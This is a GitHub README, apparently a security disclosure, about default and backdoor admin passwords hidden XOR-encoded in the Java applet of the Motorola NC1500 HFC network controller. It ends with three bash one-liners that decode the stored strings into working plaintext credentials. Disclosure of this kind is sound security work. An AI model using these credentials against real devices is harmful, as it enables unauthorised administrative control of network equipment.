# nc1500
Motorola NC1500 Backdoor Password

![alt text](https://github.com/billchaison/nc1500/raw/main/mot.png)

The Motorola NC1500 Hybrid Fiber Coax (HFC) Network Controller has a default and backdoor password present in the `nc1500.jar` Java applet that is served from the device's web page.  The credentials are present in software version 1.9.4.

The web page on the device presents a user with this login page.  If you enter an incorrect password you gain read-only privileges.  Entering one of the correct passwords grants admin privileges.

![alt text](https://github.com/billchaison/nc1500/raw/main/mo1.png)

The source HTML of the device's landing page includes a remark, which is a reference to the backdoor password.

![alt text](https://github.com/billchaison/nc1500/raw/main/mo4.png)

The backdoor and default passwords appear as XOR encoded strings in the `NC1500Applet.class` file.  The decoding function also appears in the same file, which transforms each character to plaintext using 0x40.

![alt text](https://github.com/billchaison/nc1500/raw/main/mo2.png)<br />
![alt text](https://github.com/billchaison/nc1500/raw/main/mo3.png)

The following bash one-liners produce the plaintext passwords.

```bash
a='%33%.#%```'; b=($(echo -n $a | xxd -p | fold -w 2)); c=""; for d in "${!b[@]}"; do e=$(printf "%02x" $(("0x${b[$d]}"^0x40))); c="$c$e"; done; echo $c | xxd -r -p; echo
```

```bash
a='-/4/2/,!``'; b=($(echo -n $a | xxd -p | fold -w 2)); c=""; for d in "${!b[@]}"; do e=$(printf "%02x" $(("0x${b[$d]}"^0x40))); c="$c$e"; done; echo $c | xxd -r -p; echo
```

```bash
a='$%6%,/0```'; b=($(echo -n $a | xxd -p | fold -w 2)); c=""; for d in "${!b[@]}"; do e=$(printf "%02x" $(("0x${b[$d]}"^0x40))); c="$c$e"; done; echo $c | xxd -r -p; echo
```
